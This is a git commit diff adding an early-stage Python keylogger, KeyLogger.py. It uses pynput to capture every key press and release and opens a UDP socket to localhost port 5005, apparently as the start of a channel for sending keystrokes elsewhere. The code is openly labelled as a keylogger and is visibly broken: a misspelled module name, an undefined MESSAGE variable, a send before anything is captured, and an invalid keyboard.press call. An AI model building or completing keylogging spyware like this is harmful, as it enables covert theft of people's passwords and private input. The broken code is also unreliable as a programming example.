0ec433bc56bb0de63a48898289ccca3eabb7879a
FilipponeM <115741060+FilipponeM@users.noreply.github.com>
2025-01-17 10:43:26 -0500

    Added Key listener functions and basic UDP connection

--- KeyLogger.py
+++ KeyLogger.py
@@ -1,1 +1,38 @@
-#test
+# Key Logger Python 
+
+import pynput
+import socket
+
+from pynput.keyboard import Key, Listener
+
+from pynput import keyboard
+
+UDP_IP = "127.0.0.1"
+UDP_PORT = 5005
+
+sock = socket.socket(socket.AF_INET, socker.SOCK_DGRAM) # UDP
+sock.sendto(MESSAGE, (UDP_IP, UDP_PORT))
+
+def on_press(key):
+    try:
+        print('alphanumeric key {0} pressed'.format(
+            key.char))
+    except AttributeError:
+        print('special key {0} pressed'.format(
+            key))
+
+def on_release(key):
+    print('{0} released'.format(
+        key))
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+# Collect events until released
+with keyboard.Listener(
+        on_press=on_press,
+        on_release=on_release) as listener:
+    listener.join()
+
+keyboard.press('a')
+keyboard.release('a')
